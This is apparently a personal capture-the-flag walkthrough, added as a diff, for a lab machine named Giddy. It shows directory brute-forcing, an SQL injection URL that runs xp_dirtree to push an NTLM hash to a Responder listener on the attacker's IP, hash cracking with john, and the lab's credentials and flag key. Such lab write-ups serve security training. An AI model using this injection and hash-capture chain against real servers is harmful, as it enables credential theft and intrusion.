@@ -1,0 +1,41 @@
+#10.10.10.104
+#PORT- 80, 443(IIS), 3389(ms-wbt-server)
+
+#use https://10.10.10.104
+#nmap
+#gobuster- /remote, /mvc, aspnet_client
+gobuster -u https://10.10.10.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k
+
+#star the listner with responder
+responder -i 10.10.14.181 -I tun0 -r On -v -f On
+
+#learn about xp_dirtree vulnerability
+http://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html
+#add this at the end of the website url
+EXEC master.sys.xp_dirtree '\\<tun0 IP>\whatever',1,1;
+#this is url
+https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;EXEC%20master.sys.xp_dirtree%20%27\\10.10.14.181\whatever%27,1,1;
+
+#got hash and username
+#USER= GIDDY\Stacy
+
+#Put hash into one file(hash.txt) and crack using john
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+#found cracked value
+#PASSWD= xNnWo6272k7x
+
+#log in to website https://10.10.10.104/remote
+#USER= GIDDY\Stacy
+#PASSWD= xNnWo6272k7x
+COMPUTER NAME= Giddy
+
+
+
+#key
+10C1C275385280605E96ADD808C1A0AD
+
+
+
+rdesktop 10.10.10.104
+
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/wendels-small-hacking-tricks-microsoft-sql-server-edition/
